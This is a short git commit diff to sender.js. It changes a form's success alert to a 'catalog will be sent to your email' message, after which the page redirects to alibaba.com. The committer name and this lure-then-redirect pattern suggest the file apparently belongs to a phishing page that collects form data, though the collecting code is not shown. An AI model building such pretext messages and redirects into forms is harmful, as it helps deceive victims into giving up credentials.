cbadab1f1dca21d8089aa78e5e2d1e7ff6dcdea4
user-loginmail <richard.adejumofirm@gmail.com>
2024-07-22 13:30:39 +0200

    Update sender.js

--- sender.js
+++ sender.js
@@ -38,7 +38,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 })
                 .then(response => {
                     if (response.ok) {
-                        alert('Message sent successfully!');
+                        alert('PGR: Thank you! Catalog will be sent to your email shortly!');
                         window.location.href = 'https://www.alibaba.com';
                     } else {
                         alert('Error sending message.');
